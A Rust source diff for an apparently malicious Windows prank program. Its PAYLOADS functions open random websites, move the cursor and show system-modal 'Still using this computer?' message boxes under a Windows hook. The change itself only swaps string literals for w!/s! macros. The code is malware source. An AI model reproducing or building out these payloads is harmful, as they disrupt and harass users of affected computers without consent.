@@ -40,7 +40,7 @@ use windows::{
                 SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
             },
         },
-    },
+    }, s, w,
 };
 
 pub const PAYLOADS: &[PAYLOAD] = &[
@@ -109,7 +109,7 @@ pub fn payload_thread(parameter: &Payload) {
 fn payload_execute(times: i32, _runtime: i32) -> i32 {
     wrap_shell_execute_w(
         HWND::default(),
-        "open",
+        w!("open"),
         SITES[rand::random::<usize>() % N_SITES],
         PCWSTR::null(),
         PCWSTR::null(),
@@ -117,7 +117,7 @@ fn payload_execute(times: i32, _runtime: i32) -> i32 {
     )
     .expect("Failed ShellExecuteW()");
 
-    (1500.0 / (times as f32 / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32
+    (1500.0 / (times as f32 / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32  
 }
 
 fn payload_cursor(_times: i32, runtime: i32) -> i32 {
@@ -144,8 +144,8 @@ fn payload_message_box(times: i32, _runtime: i32) -> i32 {
         )?;
         wrap_messagebox_a(
             HWND::default(),
-            "Still using this computer?",
-            "lol",
+            s!("Still using this computer?"),
+            s!("lol"),
             MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING,
         )?;
         wrap_unhook_windows_hook_ex(hook)?;
